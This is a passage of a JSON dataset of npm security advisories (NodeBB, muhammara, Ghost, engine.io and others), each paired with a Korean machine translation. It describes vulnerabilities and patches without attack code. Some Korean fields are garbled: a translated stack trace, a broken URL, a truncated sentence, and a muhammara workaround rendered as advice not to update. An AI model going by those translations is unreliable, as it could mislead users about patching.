    "descriptionKR": "### 영향\nsocket.io 메시지 처리에서 사용되는 프로토타입이 있는 일반 개체로 인해 특별히 제작된 페이로드를 사용하여 다른 사용자를 가장하고 계정을 탈취할 수 있습니다.\n\n### 패치\n2.6.1에서 패치됨\n\n### 해결 방법\n사이트 관리자는 https://github.com/NodeBB/NodeBB/commit/48d143921753914da45926cca6370a92ed0c46b8을 자신의 코드베이스로 선택하여 익스플로잇을 패치할 수 있습니다.\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n\n[커뮤니티 포럼](https://github.com/NodeBB/NodeBB/security/advisories/community.nodebb.org/)에서 논의하세요.\n[support@nodebb.org](mailto:support@nodebb.org)로 이메일을 보내주세요."
  },
  {
    "description": "### Impact\nThe package muhammara before 2.6.2, from 3.0.0 and before 3.3.0; all versions of package hummus are vulnerable to Denial of Service (DoS) when supplied with a maliciously crafted PDF file to be parsed.\n\n### Patches\nIt has been patched in 3.4.0 and has been backported to 2.6.2\nThere is no patch for hummus, currently\n\n### Workarounds\nDo not process files from untrusted sources or update.\nReplace hummus with muhammara\n\n### References\nhttps://github.com/julianhille/MuhammaraJS/pull/235\nhttps://github.com/julianhille/MuhammaraJS/pull/238",
    "identifiers": "GHSA : GHSA-2r7v-cmch-5x26\nCVE : CVE-2022-41957",
    "severity": "HIGH",
    "updatedAt": "2023-01-31T05:02:50Z",
    "publishedAt": "2022-12-05T17:37:22Z",
    "references": "https://github.com/julianhille/MuhammaraJS/security/advisories/GHSA-2r7v-cmch-5x26\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-41957\nhttps://github.com/julianhille/MuhammaraJS/pull/235\nhttps://github.com/julianhille/MuhammaraJS/pull/238\nhttps://github.com/advisories/GHSA-2r7v-cmch-5x26",
    "name": "muhammara",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.6.2",
    "identifier": "2.6.2",
    "descriptionKR": "### 영향\n패키지 muhammara 2.6.2 이전, 3.0.0 및 3.3.0 이전; 패키지 hummus의 모든 버전은 구문 분석할 악의적으로 제작된 PDF 파일과 함께 제공된 경우 서비스 거부(DoS)에 취약합니다.\n\n### 패치\n3.4.0에서 패치되었으며 2.6.2로 백포트되었습니다.\n현재 hummus에 대한 패치가 없습니다.\n\n### 해결 방법\n신뢰할 수 없는 출처의 파일을 처리하거나 업데이트하지 마십시오.\n후무스를 무함마라로 교체\n\n### 참조\nhttps://github.com/julianhille/MuhammaraJS/pull/235\nhttps://github.com/julianhille/MuhammaraJS/pull/238"
  },
  {
    "description": "### Impact\nThe package muhammara before 2.6.2, from 3.0.0 and before 3.3.0; all versions of package hummus are vulnerable to Denial of Service (DoS) when supplied with a maliciously crafted PDF file to be parsed.\n\n### Patches\nIt has been patched in 3.4.0 and has been backported to 2.6.2\nThere is no patch for hummus, currently\n\n### Workarounds\nDo not process files from untrusted sources or update.\nReplace hummus with muhammara\n\n### References\nhttps://github.com/julianhille/MuhammaraJS/pull/235\nhttps://github.com/julianhille/MuhammaraJS/pull/238",
    "identifiers": "GHSA : GHSA-2r7v-cmch-5x26\nCVE : CVE-2022-41957",
    "severity": "HIGH",
    "updatedAt": "2023-01-31T05:02:50Z",
    "publishedAt": "2022-12-05T17:37:22Z",
    "references": "https://github.com/julianhille/MuhammaraJS/security/advisories/GHSA-2r7v-cmch-5x26\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-41957\nhttps://github.com/julianhille/MuhammaraJS/pull/235\nhttps://github.com/julianhille/MuhammaraJS/pull/238\nhttps://github.com/advisories/GHSA-2r7v-cmch-5x26",
    "name": "muhammara",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.0.0, < 3.4.0",
    "identifier": "3.4.0",
    "descriptionKR": "### 영향\n패키지 muhammara 2.6.2 이전, 3.0.0 및 3.3.0 이전; 패키지 hummus의 모든 버전은 구문 분석할 악의적으로 제작된 PDF 파일과 함께 제공된 경우 서비스 거부(DoS)에 취약합니다.\n\n### 패치\n3.4.0에서 패치되었으며 2.6.2로 백포트되었습니다.\n현재 hummus에 대한 패치가 없습니다.\n\n### 해결 방법\n신뢰할 수 없는 출처의 파일을 처리하거나 업데이트하지 마십시오.\n후무스를 무함마라로 교체\n\n### 참조\nhttps://github.com/julianhille/MuhammaraJS/pull/235\nhttps://github.com/julianhille/MuhammaraJS/pull/238"
  },
  {
    "description": "### Impact\nThe package muhammara before 2.6.2, from 3.0.0 and before 3.3.0; all versions of package hummus are vulnerable to Denial of Service (DoS) when supplied with a maliciously crafted PDF file to be parsed.\n\n### Patches\nIt has been patched in 3.4.0 and has been backported to 2.6.2\nThere is no patch for hummus, currently\n\n### Workarounds\nDo not process files from untrusted sources or update.\nReplace hummus with muhammara\n\n### References\nhttps://github.com/julianhille/MuhammaraJS/pull/235\nhttps://github.com/julianhille/MuhammaraJS/pull/238",
    "identifiers": "GHSA : GHSA-2r7v-cmch-5x26\nCVE : CVE-2022-41957",
    "severity": "HIGH",
    "updatedAt": "2023-01-31T05:02:50Z",
    "publishedAt": "2022-12-05T17:37:22Z",
    "references": "https://github.com/julianhille/MuhammaraJS/security/advisories/GHSA-2r7v-cmch-5x26\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-41957\nhttps://github.com/julianhille/MuhammaraJS/pull/235\nhttps://github.com/julianhille/MuhammaraJS/pull/238\nhttps://github.com/advisories/GHSA-2r7v-cmch-5x26",
    "name": "hummus",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.6.2",
    "descriptionKR": "### 영향\n패키지 muhammara 2.6.2 이전, 3.0.0 및 3.3.0 이전; 패키지 hummus의 모든 버전은 구문 분석할 악의적으로 제작된 PDF 파일과 함께 제공된 경우 서비스 거부(DoS)에 취약합니다.\n\n### 패치\n3.4.0에서 패치되었으며 2.6.2로 백포트되었습니다.\n현재 hummus에 대한 패치가 없습니다.\n\n### 해결 방법\n신뢰할 수 없는 출처의 파일을 처리하거나 업데이트하지 마십시오.\n후무스를 무함마라로 교체\n\n### 참조\nhttps://github.com/julianhille/MuhammaraJS/pull/235\nhttps://github.com/julianhille/MuhammaraJS/pull/238"
  },
  {
    "description": "ToolJet/ToolJet placed no limit on the file size for user avatars. This could cause a denial of service if too many users upload large files. This is fixed in commit 01cd3f0464747973ec329e9fb1ea12743d3235cc in version 1.27.0.\n\n`tooljet` is no longer listed on npmjs.com but was [listed on npmjs.com in the past](https://web.archive.org/web/20220210014826/https://www.npmjs.com/package/tooljet). This advisory is maintained for historical completeness.",
    "identifiers": "GHSA : GHSA-hgp8-w8fj-r4cm\nCVE : CVE-2022-4111",
    "severity": "MODERATE",
    "updatedAt": "2023-07-11T13:52:19Z",
    "publishedAt": "2022-11-22T03:30:56Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-4111\nhttps://github.com/tooljet/tooljet/commit/01cd3f0464747973ec329e9fb1ea12743d3235cc\nhttps://huntr.dev/bounties/5596d072-66d2-4361-8cac-101c9c781c3d\nhttps://github.com/ToolJet/ToolJet/pull/4103\nhttps://github.com/advisories/GHSA-hgp8-w8fj-r4cm",
    "name": "tooljet",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 1.27.0",
    "identifier": "1.27.0",
    "descriptionKR": "ToolJet/ToolJet은 사용자 아바타의 파일 크기에 제한을 두지 않았습니다. 너무 많은 사용자가 대용량 파일을 업로드하면 서비스 거부가 발생할 수 있습니다. 이것은 버전 1.27.0의 커밋 01cd3f0464747973ec329e9fb1ea12743d3235cc에서 수정되었습니다.\n\n`tooljet`은 더 이상 npmjs.com에 나열되지 않지만 [과거에는 npmjs.com에 나열됨](https://web.archive.org/web/20220210014826/https://www.npmjs.com/package/ 툴젯). 이 권고는 역사적 완전성을 위해 유지됩니다."
  },
  {
    "description": "A path traversal vulnerability affects all versions of package static-dev-server. This is because when paths from users to the root directory are joined, the assets for the path accessed are relative to that of the root directory. There is currently no known workaround or fix for this issue.",
    "identifiers": "GHSA : GHSA-7fxm-c848-89q8\nCVE : CVE-2022-25848",
    "severity": "HIGH",
    "updatedAt": "2023-01-27T05:06:22Z",
    "publishedAt": "2022-11-29T18:30:18Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-25848\nhttps://gist.github.com/lirantal/5550bcd0bdf92c1b56fbb20e141fe5bd\nhttps://security.snyk.io/vuln/SNYK-JS-STATICDEVSERVER-3149917\nhttps://github.com/advisories/GHSA-7fxm-c848-89q8",
    "name": "static-dev-server",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "= 1.0.0",
    "descriptionKR": "경로 순회 취약점은 static-dev-server 패키지의 모든 버전에 영향을 미칩니다. 이는 사용자에서 루트 디렉터리로의 경로가 결합될 때 액세스되는 경로의 자산이 루트 디렉터리의 자산에 상대적이기 때문입니다. 현재 이 문제에 대해 알려진 해결 방법이나 수정 사항이 없습니다."
  },
  {
    "description": "decode-uri-component 0.2.0 is vulnerable to Improper Input Validation resulting in DoS.",
    "identifiers": "GHSA : GHSA-w573-4hg7-7wgq\nCVE : CVE-2022-38900",
    "severity": "HIGH",
    "updatedAt": "2023-07-03T18:38:26Z",
    "publishedAt": "2022-11-28T15:30:24Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-38900\nhttps://github.com/SamVerschueren/decode-uri-component/issues/5\nhttps://github.com/sindresorhus/query-string/issues/345\nhttps://github.com/SamVerschueren/decode-uri-component/commit/746ca5dcb6667c5d364e782d53c542830e4c10b9\nhttps://github.com/SamVerschueren/decode-uri-component/releases/tag/v0.2.1\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ERN6YE3DS7NBW7UH44SCJBMNC2NWQ7SM/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/KAC5KQ2SEWAMQ6UZAUBZ5KXKEOESH375/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VNV2GNZXOTEDAJRFH3ZYWRUBGIVL7BSU/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/QABOUA2I542UTANVZIVFKWMRYVHLV32D/\nhttps://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/UW4SCMT3SEUFVIL7YIADQ5K36GJEO6I5/\nhttps://github.com/advisories/GHSA-w573-4hg7-7wgq",
    "name": "decode-uri-component",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 0.2.1",
    "identifier": "0.2.1",
    "descriptionKR": "decode-uri-component 0.2.0은 부적절한 입력 검증에 취약하여 DoS를 유발합니다."
  },
  {
    "description": "Heap buffer overflow in GPU in Google Chrome prior to 107.0.5304.121 allowed a remote attacker who had compromised the renderer process to potentially perform a sandbox escape via a crafted HTML page. (Chromium security severity: High)",
    "identifiers": "GHSA : GHSA-995f-9x5r-2rcj\nCVE : CVE-2022-4135",
    "severity": "CRITICAL",
    "updatedAt": "2023-05-03T13:53:50Z",
    "publishedAt": "2022-11-25T03:30:19Z",
    "references": "https://nvd.nist.gov/vuln/detail/CVE-2022-4135\nhttps://chromereleases.googleblog.com/2022/11/stable-channel-update-for-desktop_24.html\nhttps://crbug.com/1392715\nhttps://github.com/electron/electron/pull/36444\nhttps://github.com/electron/electron/pull/36447\nhttps://security.gentoo.org/glsa/202305-10\nhttps://github.com/advisories/GHSA-995f-9x5r-2rcj",
    "name": "electron",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 19.0.0, < 19.1.8",
    "identifier": "19.1.8",
    "descriptionKR": "107.0.5304.121 이전의 Google Chrome에서 GPU의 힙 버퍼 오버플로는 렌더러 프로세스를 손상시킨 원격 공격자가 제작된 HTML 페이지를 통해 잠재적으로 샌드박스 탈출을 수행할 수 있도록 허용했습니다. (Chromium 보안 심각도: 높음)"
  },
  {
    "description": "### Impact\n\nOn sites where members is enabled (this is the default) it is possible for members (unprivileged users) to make changes to newsletter settings. This gives unprivileged users the ability to view and change settings they were not intended to have access to. They are not able to escalate their privileges permanently or get access to further information. This issue was caused by a gap in our API validation for nested objects.\n\nGhost(Pro) has already been patched. We can find no evidence that the issue was exploited on Ghost(Pro) prior to the patch being added.\n\nSelf-hosters are impacted if running Ghost a version between v4.46.0 and v4.48.7 or any version of v5 prior to v5.22.7. Immediate action should be taken to secure your site - see patches & workarounds below.\n\n### Patches\n-  v4.48.8 / v5.22.7 are patched for all known exploits.\n-  v4.48.9 / v5.24.1 contain deeper fixes to the API to close the potential for this vulnerability to appear elsewhere or regress \n\n### Workarounds\nThe known exploit can be prevented by [disabling members](https://ghost.org/help/can-i-disable-memberships/) until an update can be performed.\n\n### References\n- [forum post](https://forum.ghost.org/t/security-update-available-for-ghost-4-x-and-4-x/34475)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at [security@ghost.org](mailto:security@ghost.org)\n\n---\n\nCredits: Dave McDaniel and other members of [Cisco Talos](https://talosintelligence.com/vulnerability_reports)",
    "identifiers": "GHSA : GHSA-9gh8-wp53-ccc6\nCVE : CVE-2022-41654",
    "severity": "HIGH",
    "updatedAt": "2023-01-29T05:05:25Z",
    "publishedAt": "2022-11-28T22:06:24Z",
    "references": "https://github.com/TryGhost/Ghost/security/advisories/GHSA-9gh8-wp53-ccc6\nhttps://forum.ghost.org/t/security-update-available-for-ghost-4-48-7-and-5-22-6/34475\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-41654\nhttps://talosintelligence.com/vulnerability_reports/TALOS-2022-1624\nhttps://github.com/advisories/GHSA-9gh8-wp53-ccc6",
    "name": "ghost",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.46.0, < 4.48.8",
    "identifier": "4.48.8",
    "descriptionKR": "### 영향\n\n회원이 활성화된(기본값) 사이트에서는 회원(권한 없는 사용자)이 뉴스레터 설정을 변경할 수 있습니다. 이렇게 하면 권한이 없는 사용자가 액세스 권한이 없는 설정을 보고 변경할 수 있습니다. 권한을 영구적으로 에스컬레이션하거나 추가 정보에 액세스할 수 없습니다. 이 문제는 중첩 개체에 대한 API 유효성 검사의 차이로 인해 발생했습니다.\n\nGhost(Pro)는 이미 패치되었습니다. 패치가 추가되기 전에 Ghost(Pro)에서 문제가 악용되었다는 증거를 찾을 수 없습니다.\n\nv4.46.0과 v4.48.7 사이의 버전 또는 v5.22.7 이전의 v5 버전을 실행하는 경우 셀프 호스팅 사용자가 영향을 받습니다. 사이트 보안을 위해 즉각적인 조치를 취해야 합니다. 아래의 패치 및 해결 방법을 참조하세요.\n\n### 패치\n- v4.48.8 / v5.22.7은 알려진 모든 익스플로잇에 대해 패치되었습니다.\n- v4.48.9 / v5.24.1에는 API에 대한 더 깊은 수정 사항이 포함되어 이 취약점이 다른 곳에 나타나거나 퇴행할 가능성을 닫습니다.\n\n### 해결 방법\n알려진 악용은 업데이트를 수행할 수 있을 때까지 [구성원 비활성화](https://ghost.org/help/can-i-disable-memberships/)를 통해 방지할 수 있습니다.\n\n### 참조\n- [포럼 게시물](https://forum.ghost.org/t/security-update-available-for-ghost-4-x-and-4-x/34475)\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [security@ghost.org](mailto:security@ghost.org)로 이메일을 보내주세요.\n\n---\n\n크레딧: Dave McDaniel 및 [Cisco Talos](https://talosintelligence.com/vulnerability_reports)의 다른 구성원"
  },
  {
    "description": "### Impact\n\nOn sites where members is enabled (this is the default) it is possible for members (unprivileged users) to make changes to newsletter settings. This gives unprivileged users the ability to view and change settings they were not intended to have access to. They are not able to escalate their privileges permanently or get access to further information. This issue was caused by a gap in our API validation for nested objects.\n\nGhost(Pro) has already been patched. We can find no evidence that the issue was exploited on Ghost(Pro) prior to the patch being added.\n\nSelf-hosters are impacted if running Ghost a version between v4.46.0 and v4.48.7 or any version of v5 prior to v5.22.7. Immediate action should be taken to secure your site - see patches & workarounds below.\n\n### Patches\n-  v4.48.8 / v5.22.7 are patched for all known exploits.\n-  v4.48.9 / v5.24.1 contain deeper fixes to the API to close the potential for this vulnerability to appear elsewhere or regress \n\n### Workarounds\nThe known exploit can be prevented by [disabling members](https://ghost.org/help/can-i-disable-memberships/) until an update can be performed.\n\n### References\n- [forum post](https://forum.ghost.org/t/security-update-available-for-ghost-4-x-and-4-x/34475)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at [security@ghost.org](mailto:security@ghost.org)\n\n---\n\nCredits: Dave McDaniel and other members of [Cisco Talos](https://talosintelligence.com/vulnerability_reports)",
    "identifiers": "GHSA : GHSA-9gh8-wp53-ccc6\nCVE : CVE-2022-41654",
    "severity": "HIGH",
    "updatedAt": "2023-01-29T05:05:25Z",
    "publishedAt": "2022-11-28T22:06:24Z",
    "references": "https://github.com/TryGhost/Ghost/security/advisories/GHSA-9gh8-wp53-ccc6\nhttps://forum.ghost.org/t/security-update-available-for-ghost-4-48-7-and-5-22-6/34475\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-41654\nhttps://talosintelligence.com/vulnerability_reports/TALOS-2022-1624\nhttps://github.com/advisories/GHSA-9gh8-wp53-ccc6",
    "name": "ghost",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 5.0.0, < 5.22.7",
    "identifier": "5.22.7",
    "descriptionKR": "### 영향\n\n회원이 활성화된(기본값) 사이트에서는 회원(권한 없는 사용자)이 뉴스레터 설정을 변경할 수 있습니다. 이렇게 하면 권한이 없는 사용자가 액세스 권한이 없는 설정을 보고 변경할 수 있습니다. 권한을 영구적으로 에스컬레이션하거나 추가 정보에 액세스할 수 없습니다. 이 문제는 중첩 개체에 대한 API 유효성 검사의 차이로 인해 발생했습니다.\n\nGhost(Pro)는 이미 패치되었습니다. 패치가 추가되기 전에 Ghost(Pro)에서 문제가 악용되었다는 증거를 찾을 수 없습니다.\n\nv4.46.0과 v4.48.7 사이의 버전 또는 v5.22.7 이전의 v5 버전을 실행하는 경우 셀프 호스팅 사용자가 영향을 받습니다. 사이트 보안을 위해 즉각적인 조치를 취해야 합니다. 아래의 패치 및 해결 방법을 참조하세요.\n\n### 패치\n- v4.48.8 / v5.22.7은 알려진 모든 익스플로잇에 대해 패치되었습니다.\n- v4.48.9 / v5.24.1에는 API에 대한 더 깊은 수정 사항이 포함되어 이 취약점이 다른 곳에 나타나거나 퇴행할 가능성을 닫습니다.\n\n### 해결 방법\n알려진 악용은 업데이트를 수행할 수 있을 때까지 [구성원 비활성화](https://ghost.org/help/can-i-disable-memberships/)를 통해 방지할 수 있습니다.\n\n### 참조\n- [포럼 게시물](https://forum.ghost.org/t/security-update-available-for-ghost-4-x-and-4-x/34475)\n\n### 자세한 내용은\n이 권고에 대한 질문이나 의견이 있는 경우:\n* [security@ghost.org](mailto:security@ghost.org)로 이메일을 보내주세요.\n\n---\n\n크레딧: Dave McDaniel 및 [Cisco Talos](https://talosintelligence.com/vulnerability_reports)의 다른 구성원"
  },
  {
    "description": "`sweetalert2` versions 8.19.1 and up until 9.0.0 are vulnerable to hidden functionality that was introduced by the maintainer. The package outputs audio and/or video messages that do not pertain to the functionality of the package and is not included in versions below 8.19.1.\n\n### Workaround\nUse a version < 8.19.1 of the package until the maintainer releases a fix.",
    "identifiers": "GHSA : GHSA-8jh9-wqpf-q52c",
    "severity": "LOW",
    "updatedAt": "2023-01-11T05:03:25Z",
    "publishedAt": "2022-11-23T15:49:51Z",
    "references": "https://github.com/sweetalert2/sweetalert2/releases/tag/v11.4.9\nhttps://www.npmjs.com/package/sweetalert2\nhttps://github.com/advisories/GHSA-8jh9-wqpf-q52c",
    "name": "sweetalert2",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 8.19.1, < 9.0.0",
    "descriptionKR": "`sweetalert2` 버전 8.19.1 및 최대 9.0.0은 관리자가 도입한 숨겨진 기능에 취약합니다. 패키지는 패키지의 기능과 관련이 없고 8.19.1 이하 버전에 포함되지 않은 오디오 및/또는 비디오 메시지를 출력합니다.\n\n### 해결 방법\n관리자가 수정 사항을 릴리스할 때까지 패키지 버전 < 8.19.1을 사용하십시오."
  },
  {
    "description": "`sweetalert2` versions 9.17.4 and up until 10.0.0 are vulnerable to hidden functionality that was introduced by the maintainer. The package outputs audio and/or video messages that do not pertain to the functionality of the package and is not included in versions 9.0.0 - 9.17.3.\n\n### Workaround\nUse a version 9.0.0 - 9.17.3 of the package until the maintainer releases a fix.",
    "identifiers": "GHSA : GHSA-pg98-6v7f-2xfv",
    "severity": "LOW",
    "updatedAt": "2023-01-11T05:03:25Z",
    "publishedAt": "2022-11-23T15:44:52Z",
    "references": "https://github.com/sweetalert2/sweetalert2/releases/tag/v11.4.9\nhttps://www.npmjs.com/package/sweetalert2\nhttps://github.com/advisories/GHSA-pg98-6v7f-2xfv",
    "name": "sweetalert2",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 9.17.4, < 10.0.0",
    "descriptionKR": "`sweetalert2` 버전 9.17.4 및 최대 10.0.0은 관리자가 도입한 숨겨진 기능에 취약합니다. 패키지는 패키지의 기능과 관련이 없고 버전 9.0.0 - 9.17.3에 포함되지 않은 오디오 및/또는 비디오 메시지를 출력합니다.\n\n### 해결 방법\n관리자가 수정 사항을 릴리스할 때까지 버전 9.0.0 - 9.17.3 패키지를 사용하십시오."
  },
  {
    "description": "`sweetalert2` versions 10.16.10 and up until 11.0.0 are vulnerable to hidden functionality that was introduced by the maintainer. The package outputs audio and/or video messages that do not pertain to the functionality of the package and is not included in versions 10.0.0 - 10.16.9.\n\n### Workaround\nUse a version 10.0.0 - 10.16.9 of the package until the maintainer releases a fix.",
    "identifiers": "GHSA : GHSA-457r-cqc8-9vj9",
    "severity": "LOW",
    "updatedAt": "2023-01-11T05:03:30Z",
    "publishedAt": "2022-11-23T15:39:50Z",
    "references": "https://github.com/sweetalert2/sweetalert2/releases/tag/v11.4.9\nhttps://www.npmjs.com/package/sweetalert2\nhttps://github.com/advisories/GHSA-457r-cqc8-9vj9",
    "name": "sweetalert2",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 10.16.10, < 11.0.0",
    "descriptionKR": "`sweetalert2` 버전 10.16.10 및 최대 11.0.0은 관리자가 도입한 숨겨진 기능에 취약합니다. 패키지는 패키지의 기능과 관련이 없고 버전 10.0.0 - 10.16.9에 포함되지 않은 오디오 및/또는 비디오 메시지를 출력합니다.\n\n### 해결 방법\n관리자가 수정 사항을 릴리스할 때까지 패키지 버전 10.0.0 - 10.16.9를 사용하십시오."
  },
  {
    "description": "### Impact\n\nA specially crafted HTTP request can trigger an uncaught exception on the Engine.IO server, thus killing the Node.js process.\n\n```\nevents.js:292\n      throw er; // Unhandled 'error' event\n      ^\n\nError: read ECONNRESET\n    at TCP.onStreamRead (internal/stream_base_commons.js:209:20)\nEmitted 'error' event on Socket instance at:\n    at emitErrorNT (internal/streams/destroy.js:106:8)\n    at emitErrorCloseNT (internal/streams/destroy.js:74:3)\n    at processTicksAndRejections (internal/process/task_queues.js:80:21) {\n  errno: -104,\n  code: 'ECONNRESET',\n  syscall: 'read'\n}\n```\n\nThis impacts all the users of the [`engine.io`](https://www.npmjs.com/package/engine.io) package, including those who uses depending packages like [`socket.io`](https://www.npmjs.com/package/socket.io).\n\n### Patches\n\nA fix has been released today (2022/11/20):\n\n| Version range     | Fixed version |\n|-------------------|---------------|\n| `engine.io@3.x.y` | `3.6.1`       |\n| `engine.io@6.x.y` | `6.2.1`       |\n\nFor `socket.io` users:\n\n| Version range               | `engine.io` version | Needs minor update?                                                                                    |\n|-----------------------------|---------------------|--------------------------------------------------------------------------------------------------------|\n| `socket.io@4.5.x`           | `~6.2.0`            | `npm audit fix` should be sufficient                                                                   |\n| `socket.io@4.4.x`           | `~6.1.0`            | Please upgrade to `socket.io@4.5.x`                                                                    |\n| `socket.io@4.3.x`           | `~6.0.0`            | Please upgrade to `socket.io@4.5.x`                                                                    |\n| `socket.io@4.2.x`           | `~5.2.0`            | Please upgrade to `socket.io@4.5.x`                                                                    |\n| `socket.io@4.1.x`           | `~5.1.1`            | Please upgrade to `socket.io@4.5.x`                                                                    |\n| `socket.io@4.0.x`           | `~5.0.0`            | Please upgrade to `socket.io@4.5.x`                                                                    |\n| `socket.io@3.1.x`           | `~4.1.0`            | Please upgrade to `socket.io@4.5.x` (see [here](https://socket.io/docs/v4/migrating-from-3-x-to-4-0/)) |\n| `socket.io@3.0.x`           | `~4.0.0`            | Please upgrade to `socket.io@4.5.x` (see [here](https://socket.io/docs/v4/migrating-from-3-x-to-4-0/)) |\n| `socket.io@2.5.0`           | `~3.6.0`            | `npm audit fix` should be sufficient                                                                   |\n| `socket.io@2.4.x` and below | `~3.5.0`            | Please upgrade to `socket.io@2.5.0`                                                                    |\n\n### Workarounds\n\nThere is no known workaround except upgrading to a safe version.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Open an issue in [`engine.io`](https://github.com/socketio/engine.io)\n\nThanks to [Jonathan Neve](https://github.com/jonathanneve) for the responsible disclosure.\n",
    "identifiers": "GHSA : GHSA-r7qp-cfhv-p84w\nCVE : CVE-2022-41940",
    "severity": "MODERATE",
    "updatedAt": "2023-02-01T05:03:21Z",
    "publishedAt": "2022-11-21T23:55:41Z",
    "references": "https://github.com/socketio/engine.io/security/advisories/GHSA-r7qp-cfhv-p84w\nhttps://nvd.nist.gov/vuln/detail/CVE-2022-41940\nhttps://github.com/socketio/engine.io/commit/425e833ab13373edf1dd5a0706f07100db14e3c6\nhttps://github.com/socketio/engine.io/commit/83c4071af871fc188298d7d591e95670bf9f9085\nhttps://github.com/advisories/GHSA-r7qp-cfhv-p84w",
    "name": "engine.io",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.0.0, < 6.2.1",
    "identifier": "6.2.1",
    "descriptionKR": "### 영향\n\n특별히 제작된 HTTP 요청은 Engine.IO 서버에서 포착되지 않은 예외를 트리거하여 Node.js 프로세스를 중단시킬 수 있습니다.\n\n```\nevents.js:292\n      던져 어; // 처리되지 않은 '오류' 이벤트\n      ^^\n\n오류: ECONNRESET 읽기\n    TCP.onStreamRead(internal/stream_base_commons.js:209:20)에서\n소켓 인스턴스에서 발생한 '오류' 이벤트:\n    emitErrorNT(internal/streams/destroy.js:106:8)에서\n    emitErrorCloseNT에서(internal/streams/destroy.js:74:3)\n    processTicksAndRejections에서(내부/프로세스/task_queues.js:80:21) {\n  오류 번호: -104,\n  코드: 'ECONNRESET',\n  시스템 호출: '읽기'\n}\n```\n\n이는 [`socket.io`](https: //www.npmjs.com/package/socket.io).\n\n### 패치\n\n수정 사항이 오늘(2022/11/20) 릴리스되었습니다.\n\n| 버전 범위 | 고정 버전 |\n|----|---------------|\n| `engine.io@3.x.y` | `3.6.1` |\n| `engine.io@6.x.y` | `6.2.1` |\n\n`socket.io` 사용자의 경우:\n\n| 버전 범위 | `engine.io` 버전 | 사소한 업데이트가 필요하십니까? |\n|--------------------------------------------|---- --|----------------------------------------------- -------------------------------------------------- -------|\n| `socket.io@4.5.x` | `~6.2.0` | `npm 감사 수정`으로 충분해야 합니다 |\n| `socket.io@4.4.x` | `~6.1.0` | `socket.io@4.5.x`로 업그레이드하십시오 |\n| `socket.io@4.3.x` | `~6.0.0` | `socket.io@4.5.x`로 업그레이드하십시오 |\n| `socket.io@4.2.x` | `~5.2.0` | `socket.io@4.5.x`로 업그레이드하십시오 |\n| `socket.io@4.1.x` | `~5.1.1` | `socket.io@4.5.x`로 업그레이드하십시오 |\n| `socket.io@4.0.x` | `~5.0.0` | `socket.io@4.5.x`로 업그레이드하십시오 |\n| `socket.io@3.1.x` | `~4.1.0` | `socket.io@4.5.x`로 업그레이드하십시오([여기](https://socket.io/docs/v4/migrating-from-3-x-to-4-0/) 참조) |\n| `socket.io@3.0.x` | `~4.0.0` | `socket.io@4.5.x`로 업그레이드하십시오([여기](https://socket.io/docs/v4/migrating-from-3-x-to-4-0/) 참조) |\n| `socket.io@2.5.0` | `~3.6.0` | `npm 감사 수정`으로 충분해야 합니다 |\n| `socket.io@2.4.x` 이하 | `~3.5.0` | `socket.io@2.5.0`으로 업그레이드하십시오 |\n\n### 해결 방법\n\n안전한 버전으로 업그레이드하는 것 외에는 알려진 해결 방법이 없습니다.\n\n### 자세한 내용은\n\n이 권고에 대한 질문이나 의견이 있는 경우:\n\n* [`engine.io`](https://github.com/socketio/engine.io)에서 이슈 열기\n\n책임 있는 공개에 대해 [Jonathan Neve](https://github.com/jonathanneve)에게 감사드립니다."
  },
  {
    "description": "### Impact\n\nA specially crafted HTTP request can trigger an uncaught exception on the Engine.IO server, thus killing the Node.js process.\n\n```\nevents.js:292\n      throw er; // Unhandled 'error' event\n      ^\n\nError: read ECONNRESET\n    at TCP.onStreamRead (internal/stream_base_commons.js:209:20)\nEmitted 'error' event on Socket instance at:\n    at emitErrorNT (internal/streams/destroy.js:106:8)\n    at emitErrorCloseNT (internal/streams/destroy.js:74:3)\n    at processTicksAndRejections (internal/process/task_queues.js:80:21) {\n  errno: -104,\n  code: 'ECONNRESET',\n  syscall: 'read'\n}\n```\n\nThis impacts all the users of the [`engine.io`](https://www.npmjs.com/package/engine.io) package, including those who uses depending packages like [`socket.io`](https://www.npmjs.com/package/socket.io).\n\n### Patches\n\nA fix has been released today (2022/11/20):\n\n| Version range     | Fixed version |\n|-------------------|---------------|\n| `engine.io@3.x.y` | `3.6.1`       |\n| `engine.io@6.x.y` | `6.2.1`       |\n\nFor `socket.io` users:\n\n| Version range               | `engine.io` version | Needs minor update?                                                                                    |\n|-----------------------------|---------------------|--------------------------------------------------------------------------------------------------------|\n| `socket.io@4.5.x`           | `~6.2.0`            | `npm audit fix` should be sufficient                                                                   |\n| `socket.io@4.4.x`           | `~6.1.0`            | Please upgrade to `socket.io@4.5.x`                                                                    |\n| `socket.io@4.3.x`           